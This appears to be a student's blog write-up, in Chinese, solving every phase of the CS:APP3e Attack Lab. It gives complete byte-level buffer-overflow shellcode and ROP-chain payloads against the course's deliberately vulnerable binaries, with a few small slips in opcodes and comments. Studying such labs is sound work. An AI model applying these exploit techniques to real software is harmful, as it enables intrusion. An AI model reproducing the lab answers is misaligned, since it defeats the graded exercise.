---
layout: post
title: CS:APP3e Attack Lab
date: 2022-06-02 11:59:00-0400
description: Personal Crack on CS:APP3e Attack Lab
tags: c assembly csapp gdb buffer overflow attack
categories: CSAPP 项目
giscus_comments: true
related_posts: false
toc:
  sidebar: left
---

确保先阅读并理解了CS:APPe3的**3.10.3**和**3.10.4**

先反编译:

```bash
objdump -d ctarget > ctarget.asm
objdump -d rtarget > rtarget.asm
```

最后确保仔细阅读官网的`writeup`，查看每个阶段需要做什么。

# Part 1

先明白函数栈的生长方向。ret指令的作用。push指令的作用。%rsp和%rip的作用。

能够使用gdb和objdump指令。

code-injection攻击只适合这种，没有`栈随机化`和`限定可执行代码内存范围`的情况

## Phase 1

第一个阶段很简单，只要先查看给函数`getbuf`分配了多少栈空间，利用缓冲区溢出，修改`ret`指令的返回地址(上一个栈帧的栈顶)就行。

```nasm
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28                  	subq	$0x28, %rsp
  4017ac: 48 89 e7                     	movq	%rsp, %rdi
  4017af: e8 8c 02 00 00               	callq	0x401a40 <Gets>
  4017b4: b8 01 00 00 00               	movl	$0x1, %eax
  4017b9: 48 83 c4 28                  	addq	$0x28, %rsp
  4017bd: c3                           	retq
  4017be: 90                           	nop
  4017bf: 90                           	nop

00000000004017c0 <touch1>:
```

给`getbuf`函数分配了`0x28`Byte的空间，也就是40Bytes

输入48Bytes，最后一个8Byte设定为`touch1`函数的地址就行。

注意是小端存储。

```text
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
c0 17 40 00 00 00 00 00     # 这里篡改了ret的返回函数地址
```

我存储为`phase1.txt`

作为参数运行`rtarget`:

```bash
cat phase1.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00

```

## Phase 2

第二个阶段要求带参数进入`touch2`函数，`%rdi`作为第一个参数传递。

问题在于，现在我们可以利用缓冲区溢出，修改上一个栈帧的栈顶，也就是ret指令的返回值。

但是如何执行参数赋值呢？

正常来说带参数调用函数，应该是先对参数赋值，然后进入函数。

```nasm
movl $cookie, %edi
call <touch2>
```

问题就在于如何插入这个movl的攻击代码。

我们唯一能输入的内容只有缓冲区，所以一定在缓冲区内插入我们的代码（而且writeup的提示很明显，让我们使用gcc -c选项和objdump -d来手动获取一个汇编指令的字节码）

根据第一个阶段的注入，我们可以让ret的地址，绕回这个缓冲区，也就是让`%rip`（又名程序计数器PC）来指向这个区域，然后逐条执行攻击代码。

例如下面的输入。假设%rsp在getbuf函数中，值为0xabcde0

那么可以让前一个栈帧（test函数）的栈顶改成0xabcde0

从而`getbuf`内部的ret指令执行时，PC指向0xabcde0，那么这里开始只要注入代码，就可以照常执行攻击代码，从而对`%rdi`赋值cookie

```text
00 00 00 00 00 00 00 00     # 假设这里的地址是0xabcde0  <- %rsp
00 00 00 00 00 00 00 00     # 那么这里的地址是0xabcde8
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
e0 cd ab 00 00 00 00 00     # 这里篡改了ret的返回函数地址 <- %rsp + 0x28
```

需要注意的是，执行完了movl给第一个参数赋值cookie，我们要跳转到`touch2`: 0x4017ec的位置

writeup中说明了，最好不要使用call或者jmp指令，所以我们仍然使用ret指令。

当`getbuf`内部的ret指令执行完毕后，PC指向攻击代码的部分，同时，%rsp指向原本栈帧`test`函数的部分

为了跳转`touch2`，我们要push一次`touch2`的地址。

所以初步的攻击代码如下:

```nasm
movl    $0x59b997fa, %edi
pushq   $0x4017ec
ret
```

将其转为字节码后，作为输入的字符串。

```bash
touch attack2.s
vim attack2.s     # 编辑代码
gcc -c attack2.s
objdump -d attack2.o
```

得到:

```text
attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq
```

同时，需要知道当程序运行到`getbuf`时，`%rsp`寄存器的值，因为我们需要绕回到这个地址然后逐行执行攻击代码。

在`getbuf`第二行汇编处断点，用gdb调试打印`%rsp`寄存器的值即可。

```bash
(gdb) i r rsp
0x5561dc78
```

所以level2的注入代码如下:

```text
bf fa 97 b9 59 68 ec 17
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

## Phase 3

首先读懂要做什么，请仔细阅读writeup.

其实就是getbuf结束后，不回到test函数，而是调用touch3，同时传入字符串。这个字符串的值要求是cookie的ascii表示:

```text
cookie: 0x59b997fa
hex:    35 39 62 39 39 37 66 61 # 这个作为字符串存放在内存的某个位置
```

梳理一下内容，首先我们在test函数中调用了getbuf函数。

然后有了这样的栈帧结构:

(高地址在第一行, 注意下面是栈的结构)

```text
?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧
[ret address (64bit)]   # getbuf函数结束后ret的参考地址 这里是%rsp + 0x28
xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx # <- %rsp的位置 同时也是缓冲区输入的位置
```

按照level2的攻击方式，我们先把最后一行填充完毕，然后覆盖掉`ret address`的地址，让%rip指向上面的最后一行，也就是注入的代码。从而执行攻击代码。

但是writeup中提及，当`hexmatch`和`strncmp`调用的时候，会push数据到栈中。

下面是`getbuf`执行完毕后栈的情况:

```text
?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 <- %rsp的位置
[ret address (64bit)]   # 因为ret将%rip的位置设置到了这一行的地址
xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx #
xx xx xx xx xx xx xx xx # <- %rip 即将要执行的攻击代码
```

假如我们攻击代码要开始调用`touch3`了，然后内部再次调用`hexmatch`和`strncmp`函数。(这时候已经执行到攻击代码的最后一行ret)

稍微查看`hexmatch`就会发现，它居然push了一堆东西，并且让%rsp减了0x80，这让我们的攻击代码被覆盖。

其实代码被覆盖没有问题，因为我们在`gebuf`执行完毕之后，执行了一遍攻击代码，然后`ret`到我们设定的`touch3`位置。

但是我们输入的字符串数据将会被覆盖，这就是要解决的问题。显然继续往栈顶放置字符串不妥，因为我们不清楚栈被push了多少内容。那就牺牲test函数的栈顶了。(`?`的位置)

所以，这一次，我们需要将字符串作为参数，存放在test函数栈帧的栈顶位置(通过gebuf的缓冲区溢出来存放)，ret的地址设定为`touch3`的函数位置(通过攻击代码的push)。

因为我们要手动填写`??`那一行，`touch3`的第一个参数`%rdi`要填入`??`那一行的地址。通过前文，或者gdb直接打印地址就行:`0x5561dca8`

```nasm
mov   $0x5561dca8, %rdi
push  $0x4018fa
ret
```

获取这段代码的字节码：

```nasm

attack3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq

```

所以答案`phase3.txt`是:

```text
48 c7 c7 a8 dc 61 55 68 # 攻击代码从这里开始 %rip是逐行执行
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # getbuf结束后ret返回攻击代码的第一行
35 39 62 39 39 37 66 61 # 覆盖test函数栈帧，安全存放字符串
```

# Part 2

前面每次运行`ctarget`的时候，栈的地址都是一样的。

但是这里`rtarget`加入了栈随机化。

这就导致了`phase2`和`phase3`很难再通过找到`%rsp`的地址来执行我们自己注入的代码。因为每次运行`%rsp`的值都不一样。

所以得根据writeup中的`ROP`策略利用已有的字节码来执行需要的操作。

利用`farm.c`的代码，来看看有没有什么灵感。

```bash
gcc -c farm.c
objdump -d farm.o > farm.asm
```

## Phase 4

要求实现跟`Phase 2`一样的操作，只不过是在`rtarget`上运行。

并且只能使用前八个寄存器.(`%rax` ~ `%rdi`)

查看`rtarget`的反编译结果，跟`ctarget`没什么两样，问题就在于我们不能注入代码了，因为加入了栈随机化，我们不知道我们注入的代码在栈的地址。

总体而言的操作和`Phase 2`一样:

```text
attack2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq
```

然后我们能够控制的就是缓冲区的输入，替换掉ret的地址，然后一直链式反应，执行我们的代码.

比如`ret`的字节码是`c3`, `nop`的字节码是`90`

那么我们需要有这样的栈结构（尽管会破坏test函数栈）:

当`getbuf`执行完毕，`%rsp`加上`0x28`然后指向下面的`address`

然后进行`ret`指令

```text
address + 0x8: [gadget 2的地址]
address:       [gadget 1的地址]  # <- %rsp 即将ret跳转到gadget1
--------上面是栈的结构----------

gadget 1: bf fa 97 b9 59 c3 # mov <cookie>, %edi; ret
gadget 2: 68 ec 17 40 00 c3 # pushq $0x4017ec; ret然后进入touch2
```

那么一目了然，只需要找到这样的字节码就行，然后在缓冲区输入gadgets的地址就行。

很遗憾我并没有从`farm`相关的字节码找到最核心的`0x4017ec`和`0x59b997fa`

所以我们必须在缓冲区输入这个地址，然后利用`pop`指令，让某个寄存器存放这个值（touch3的地址或者cookie值）

所以进一步推理栈的结构很可能是这:

```text
address + 0x10:[touch2的地址]
address + 0x8: [cookie的值]
address:       [gadget 1的地址]  # <- %rsp 即将ret跳转到gadget1
--------上面是栈的结构----------

gadget 1: popq %rdi;            # 将cookie存放在rdi中
gadget 2: ret;                  # 然后ret进入touch2
```

让我们梳理一下，按照上述的栈结构，发生了什么。

当我们输入好攻击的内容后，栈变成上述内容。然后`getbuf`即将返回，`%rsp`指向ret的地址(已经被我们篡改成gadet 1的地址)。然后`%rsp`再次加0x8，同时我们进入gadet1，执行`pop`指令把cookie存在`%rdi`。pop指令一执行，`%rsp`再次加0x8然后，再紧接着执行gadget2的`ret`，也就是进入`touch3`

也就是，我们需要这样的gadgets:

```text
5f c3 # popq $rdi; ret;
```

在`rtarget.asm`中，很容易找到:

```nasm
  401419: 69 c0 5f c3 00 00            	imull	$0xc35f, %eax, %eax     # imm = 0xC35F
```

所以gadgets的地址是`0x40141b`

所以缓冲区输入`phase4.txt`:

```text
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1b 14 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
```

精彩，不过为什么没用到`farm`的代码段呢，_无所谓了_。

只要达到了攻击效果就行。

（然而我仔细阅读了writeup之后发现，我们需要的字节码都能够在`start_farm`到`mid_farm`中找到, 其实就是pop到`%rax`中，然后再赋值给`%rdi`而已，只不过正好被我在别的程序段找到了更简洁的解法。）

## Phase 5

Phase5要求和Phase3一样，调用`touch3`并且传入字符串`cookie`

与Phase3不同的是，`rtarget`采用了栈随机化，导致我们的字符串若是存在栈中，我们需要解决栈的地址的问题。

那么总体还是一样的，就是调用`touch3`之前，保证`%rdi`的值是字符串的地址。

此外，还要将

```text
35 39 62 39 39 37 66 61 # cookie的ASCII表示
```

存在那个地址。

然后将`touch3`的地址压入栈中，`ret`指令进入`touch3`:`0x4018fa`

但是，`rtarget`中，我相信一定不会有这样的内存区域正好存着cookie的ASCII，所以这一串仍然需要我们通过缓冲区溢出的漏洞，写入栈帧中。

那么问题就在于，如何在栈随机化的程序上，明确`%rsp`的值呢？

或者，我们只需要`%rsp`的值赋值给`%rdi`，然后对`%rdi`进行一些加减操作，偏移到我们存储的地方即可。

并且注意到`farm.c`中正好就有定义`add_xy(long x, long y)`:并且在`rtarget.asm`中的`0x4019d6`

那么显然我们有这样的栈结构和操作:

```text
address + 0x28:[cookie的ASCII]  # <- %rdi + 0x20
address + 0x20: [touch3的地址]
address + 0x18: [add_xy()的地址]
address + 0x10: [第二个参数:0x20]
address + 0x8: [gadget 3的地址]  # mov %rsp, %rdi之前，%rsp是在这
address:       [gadget 1的地址]  # <- %rsp 即将ret跳转到gadget1
--------上面是栈的结构----------

gadget 1: mov %rsp, %rdi        # 获取%rsp的值 初始化add的第一个参数
gadget 2: ret                   # 进入gaget3
gadget 3: popq %rsi             # 初始化%rsi第二个参数为0x20
gadget 4: ret                   # 然后ret进入add_xy

# 进入add_xy之后ret
# %rax为加法结果: %rdi + 0x20

gadget 5: mov %rax, %rdi        # 加法结果保存为第一个参数
gadget 6: ret
```

对照gadgets的指令有:

```text
48 49 e7 # mov %rsp, %rdi
c3       # ret
5e       # popq %rsi
c3       # ret
48 89 c7 # mov %rax, %rdi
c3       # ret
```

其他指令都好找，就是`48 89 e7`找不到紧跟`c3`的。

所以只能间接将`%rsp`传递给`%rdi`

先按照前缀找:`48 89`

```nasm
0000000000401aab <setval_350>:
  401aab: c7 07 48 89 e0 90            	movl	$0x90e08948, (%rdi)     # imm = 0x90E08948
  401ab1: c3                           	retq
```

`48 89 e0`正好是`mov %rsp, %rax`是可以接受的，并且`90`是nop.

那么还差一个`mov %rax, %rdi`是重复的。

所以:

```text
address + 0x38: [cookie的ASCII]  # <- %rdi + 0x30
address + 0x30: [touch3的地址]
address + 0x28: [gadget 6的地址]
address + 0x20: [add_xy()的地址]
address + 0x18: [第二个参数:0x28]
address + 0x10: [gadget 4的地址]
address + 0x08: [gadget 2的地址]  # mov %rsp, %rax时，%rsp在这
address       : [gadget 0的地址]  # <- %rsp 即将ret跳转到gadget0
--------上面是栈的结构----------

gadget 0: mov %rsp, %rax        # 间接传递，先传给%rax
gadget 1: ret
gadget 2: mov %rax, %rdi        # 获取%rsp的值 初始化add的第一个参数
gadget 3: ret                   # 进入gadget4
gadget 4: popq %rsi             # 初始化%rsi第二个参数为0x30
gadget 5: ret                   # 然后ret进入add_xy:0x4019d6

# 进入add_xy之后ret
# %rax为加法结果: %rdi + 0x30

*gadget 6: mov %rax, %rdi        # 加法结果保存为第一个参数
*gadget 7: ret                   # 这是add_xy内部的ret
```

那么`gadgets`的字节码及其地址有:

```text
48 89 e0 # mov %rsp, %rax -> 0x401a06
c3       # ret
48 89 c7 # mov %rax, %rdi -> 0x4019a2
c3       # ret
5e       # popq %rsi      -> 0x401383
c3       # ret
48 89 c7 # mov %rax, %rdi -> 0x4019a2
c3       # ret
```

查找字节码在`rtarget.asm`的地址，得到缓冲区输入的内容有:

```text
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # 覆盖ret地址，gadget 0的地址
a2 19 40 00 00 00 00 00 # gadget 2的地址
83 13 40 00 00 00 00 00 # gadget 4的地址
30 00 00 00 00 00 00 00 # 第二个参数 0x30
d6 19 40 00 00 00 00 00 # add_xy的地址
a2 19 40 00 00 00 00 00 # gadget 6的地址
fa 18 40 00 00 00 00 00 # touch3的入口
35 39 62 39 39 37 66 61 # cookie的ASCII
```

完结撒花。

# 总结

对栈帧结构了解很多，深入理解了函数栈，以及缓冲区溢出攻击的方式。

不得不感慨国内外CS教育的差距。
